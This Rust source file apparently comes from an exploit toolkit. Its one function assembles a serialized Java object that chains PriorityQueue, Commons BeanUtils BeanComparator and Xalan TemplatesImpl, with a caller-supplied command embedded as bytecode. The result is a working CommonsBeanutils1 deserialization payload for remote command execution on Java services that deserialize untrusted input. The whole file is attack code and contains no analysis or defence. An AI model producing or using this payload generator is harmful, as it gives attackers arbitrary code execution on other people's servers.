use crate::template_impl::get_f_template_impl;

pub fn get_commons_beanutils1(cmd: &str) -> Vec<u8> {
    let mut result_bytes = [172, 237, 0, 5, 115, 114, 0, 23, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 80, 114, 105, 111, 114, 105, 116, 121, 81, 117, 101, 117, 101, 148, 218, 48, 180, 251, 63, 130, 177, 3, 0, 2, 73, 0, 4, 115, 105, 122, 101, 76, 0, 10, 99, 111, 109, 112, 97, 114, 97, 116, 111, 114, 116, 0, 22, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 67, 111, 109, 112, 97, 114, 97, 116, 111, 114, 59, 120, 112, 0, 0, 0, 2, 115, 114, 0, 43, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 98, 101, 97, 110, 117, 116, 105, 108, 115, 46, 66, 101, 97, 110, 67, 111, 109, 112, 97, 114, 97, 116, 111, 114, 227, 161, 136, 234, 115, 34, 164, 72, 2, 0, 2, 76, 0, 10, 99, 111, 109, 112, 97, 114, 97, 116, 111, 114, 113, 0, 126, 0, 1, 76, 0, 8, 112, 114, 111, 112, 101, 114, 116, 121, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 120, 112, 115, 114, 0, 63, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 99, 111, 109, 112, 97, 114, 97, 116, 111, 114, 115, 46, 67, 111, 109, 112, 97, 114, 97, 98, 108, 101, 67, 111, 109, 112, 97, 114, 97, 116, 111, 114, 251, 244, 153, 37, 184, 110, 177, 55, 2, 0, 0, 120, 112, 116, 0, 16, 111, 117, 116, 112, 117, 116, 80, 114, 111, 112, 101, 114, 116, 105, 101, 115, 119, 4, 0, 0, 0, 3, 115, 114, 0, 58, 99, 111, 109, 46, 115, 117, 110, 46, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 120, 97, 108, 97, 110, 46, 105, 110, 116, 101, 114, 110, 97, 108, 46, 120, 115, 108, 116, 99, 46, 116, 114, 97, 120, 46, 84, 101, 109, 112, 108, 97, 116, 101, 115, 73, 109, 112, 108, 9, 87, 79, 193, 110, 172, 171, 51, 3, 0, 6, 73, 0, 13, 95, 105, 110, 100, 101, 110, 116, 78, 117, 109, 98, 101, 114, 73, 0, 14, 95, 116, 114, 97, 110, 115, 108, 101, 116, 73, 110, 100, 101, 120, 91, 0, 10, 95, 98, 121, 116, 101, 99, 111, 100, 101, 115, 116, 0, 3, 91, 91, 66, 91, 0, 6, 95, 99, 108, 97, 115, 115, 116, 0, 18, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 76, 0, 5, 95, 110, 97, 109, 101, 113, 0, 126, 0, 4, 76, 0, 17, 95, 111, 117, 116, 112, 117, 116, 80, 114, 111, 112, 101, 114, 116, 105, 101, 115, 116, 0, 22, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 80, 114, 111, 112, 101, 114, 116, 105, 101, 115, 59, 120, 112, 0, 0, 0, 0, 255, 255, 255, 255, 117, 114, 0, 3, 91, 91, 66, 75, 253, 25, 21, 103, 103, 219, 55, 2, 0, 0, 120, 112, 0, 0, 0, 1, 117, 114, 0, 2, 91, 66, 172, 243, 23, 248, 6, 8, 84, 224, 2, 0, 0, 120, 112].to_vec();
    let template_impl = get_f_template_impl(cmd);
    let byte_len = template_impl.len() as u32;
    result_bytes.extend(byte_len.to_be_bytes());
    result_bytes.extend(&template_impl);
    result_bytes.extend([112, 116, 0, 4, 68, 111, 103, 101, 112, 119, 1, 0, 120, 113, 0, 126, 0, 13, 120]);
    return result_bytes;
}